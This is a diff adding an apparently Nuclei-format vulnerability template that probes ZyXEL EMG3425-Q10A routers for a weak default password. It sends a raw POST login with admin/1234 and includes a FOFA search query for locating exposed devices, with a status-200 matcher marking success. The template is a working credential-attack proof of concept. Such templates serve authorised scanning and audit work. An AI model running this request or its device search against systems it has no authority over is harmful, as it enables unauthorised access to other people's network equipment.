@@ -1,0 +1,28 @@
+id: poc-tyl606tyc0fgkh81
+info:
+  name: 众勤通信设备贸易（上海）有限公司ZyXEL-EMG3425-Q10A存在弱口令
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/tyl606tyc0fgkh81'
+  tags: default-login,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: tyl606tyc0fgkh81
+    fofa: body="ZyXEL-EMG3425-Q10A" || title="ZyXEL EMG3425-Q10A"
+http:
+- raw:
+  - 'POST /cgi-bin/luci/expert/configuration HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Content-Length: 69
+
+
+    language_choice=en&username=admin&password=1234&time_choice=GMT-0'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
